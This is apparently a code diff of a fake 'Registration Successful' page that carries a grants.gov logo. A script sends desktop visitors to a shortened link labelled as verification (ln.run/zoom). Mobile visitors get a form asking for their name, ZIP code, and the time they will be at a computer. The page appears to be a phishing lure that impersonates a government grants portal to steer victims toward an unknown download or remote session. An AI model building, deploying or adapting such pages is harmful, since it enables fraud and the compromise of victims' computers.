@@ -1,19 +1,64 @@
-<!doctype html> <html lang="en"> <head> <meta charset="utf-8"> <meta name="viewport" content="width=device-width, initial-scale=1"> <title>Registration Successful</title> <!-- Automatically redirect after 2 seconds --> <meta http-equiv="refresh" content="2;url=https://ln.run/zoom"> <style> :root { --primary: #1a4480; --primary-dark: #162e51; --text: #1b1b1b; --muted: #565c65; --background: #f5f5f5; --white: #fff; --border: #dfe1e2; } * { box-sizing: border-box; } body { margin: 0; min-height: 100vh; display: flex; flex-direction: column; font-family: system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif; color: var(--text); background: var(--background); } .site-header { background: var(--white); border-bottom: 1px solid var(--border); } .header-inner { width: min(1100px, calc(100% - 32px)); margin: auto; min-height: 90px; display: flex; align-items: center; } .logo { color: var(--primary-dark); font-size: 1.5rem; font-weight: 700; text-decoration: none; } main { flex: 1; display: flex; align-items: center; justify-content: center; padding: 40px 16px; } .card { width: min(600px, 100%); padding: 40px; text-align: center; background: var(--white); border: 1px solid var(--border); border-radius: 6px; box-shadow: 0 2px 8px rgb(0 0 0 / 8%); } .checkmark { width: 64px; height: 64px; margin: 0 auto 20px; display: flex; align-items: center; justify-content: center; border-radius: 50%; color: white; background: #237a3b; font-size: 2rem; font-weight: 700; } h1 { margin: 0 0 12px; color: var(--primary-dark); } p { margin: 0 0 24px; color: var(--muted); line-height: 1.6; } .button { display: inline-block; padding: 12px 22px; border-radius: 4px; color: var(--white); background: var(--primary); text-decoration: none; font-weight: 700; } .button:hover { background: var(--primary-dark); } .footer { padding: 24px; text-align: center; color: var(--muted); font-size: .9rem; } </style> </head> <body> <header class="site-header"> <div class="header-inner"> <a class="logo" href="/">Registration</a> </div> </header> <main> <section class="card">
-  <div class="checkmark">✓</div>
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Registration status</title>
+<style>
+:root{--primary:#1a4480;--dark:#162e51;--text:#1b1b1b;--muted:#565c65;--bg:#f5f5f5;--white:#fff;--border:#dfe1e2;--error:#b50909}
+*{box-sizing:border-box}body{margin:0;min-height:100vh;display:flex;flex-direction:column;font-family:system-ui,-apple-system,"Segoe UI",sans-serif;color:var(--text);background:var(--bg)}
+header{background:white;border-bottom:1px solid var(--border)}.header-inner{width:min(1100px,calc(100% - 32px));margin:auto;min-height:90px;display:flex;align-items:center}
+.logo{color:var(--dark);font-size:1.5rem;font-weight:700;text-decoration:none}main{flex:1;display:flex;align-items:center;justify-content:center;padding:40px 16px}
+.card{width:min(600px,100%);padding:40px;text-align:center;background:white;border:1px solid var(--border);border-radius:6px;box-shadow:0 2px 8px #0001}
+.checkmark{width:64px;height:64px;margin:0 auto 20px;display:flex;align-items:center;justify-content:center;border-radius:50%;color:white;background:#237a3b;font-size:2rem;font-weight:700}
+h1{margin:0 0 12px;color:var(--dark)}p{margin:0 0 24px;color:var(--muted);line-height:1.6}
+.button{display:inline-block;padding:12px 22px;border:0;border-radius:4px;color:white;background:var(--primary);text-decoration:none;font-weight:700;cursor:pointer}
+.restriction{display:none;text-align:left}.restriction h1{color:var(--error)}.field{margin:0 0 16px}
+label{display:block;margin-bottom:6px;font-weight:650}input{width:100%;min-height:44px;padding:10px 12px;border:1px solid #8b929a;border-radius:4px;font:inherit}
+input:focus{outline:3px solid #8bb8e8;outline-offset:1px}.help{font-size:.92rem;margin-top:-10px}.footer{padding:24px;text-align:center;color:var(--muted);font-size:.9rem}
+@media(max-width:767px){.card{padding:28px 20px}.desktop-success{display:none}.restriction{display:block}}
+</style>
+</head>
+<body>
+<header>
+	<div class="header-inner">
+		<a
+                href="./images/grants-gov-logo"
+                class="logo-link"
+            >
 
-  <h1>Thank you for registering</h1>
+                <img
+                    src="./images/grants-gov-logo-text.png"
+                    alt="Registration"
+                    class="logo"
+                >
 
-  <p>
-    Your registration has been successfully submitted.
-    You will be redirected to the verification shortly.
-  </p>
+            </a>
+	
+	</div>
+</header>
 
-  <a class="button" href="https://ln.run/zoom">
-    Click here to continue if you're not redirected
-  </a>
-
+<main>
+<section class="card desktop-success" aria-live="polite">
+<div class="checkmark" aria-hidden="true">✓</div>
+<h1>Thank you for registering</h1>
+<p>Your registration has been successfully submitted. You will be redirected to the verification shortly</p>
+<a class="button" href="https://ln.run/zoom" rel="noopener">Click here to Continue if you're not redirected</a>
 </section>
-
+<section class="card restriction" id="mobile-restriction">
+<h1>Your Information has been received. A COMPUTER IS REQUIRED TO PROCEED!!</h1>
+<p>This next process requires a computer. Please tell us when you expect to have access to one so we can coordinate your verification step.</p>
+<form name="computer-availability" method="POST" action="./ThankYou.html" data-netlify="true" netlify-honeypot="bot-field">
+<input type="hidden" name="form-name" value="computer-availability">
+<p hidden><label>Do not fill this out: <input name="bot-field"></label></p>
+<div class="field"><label for="full-name">Your name</label><input id="full-name" name="name" type="text" autocomplete="name" required></div>
+<div class="field"><label for="zipcode">ZIP code</label><input id="zipcode" name="zipcode" type="text" inputmode="numeric" autocomplete="postal-code" pattern="[0-9]{5}(-[0-9]{4})?" maxlength="10" required><p class="help">Enter a 5-digit ZIP code, or ZIP+4.</p></div>
+<div class="field"><label for="available-date">Date you expect to use a computer</label><input id="available-date" name="available_date" type="date" required></div>
+<div class="field"><label for="available-time">Approximate time</label><input id="available-time" name="available_time" type="time" required></div>
+<button class="button" type="submit">Send availability</button>
+</form>
+<p class="help" style="margin-top:18px">This form collects Verification scheduling information only. Be sure to be available at the scheduled time.</p>
+</section>
 </main> <footer class="footer">
 
       <a
@@ -36,4 +81,14 @@
         Registration Portal
       </p>
 
-    </footer> </body> </html>
+    </footer>
+<script>
+(() => {
+  // Viewport width is only a rough proxy for computer use, not reliable device detection.
+  if (window.matchMedia("(min-width: 768px)").matches) {
+    window.setTimeout(() => window.location.assign("https://ln.run/zoom"), 2000);
+  }
+})();
+</script>
+</body>
+</html>
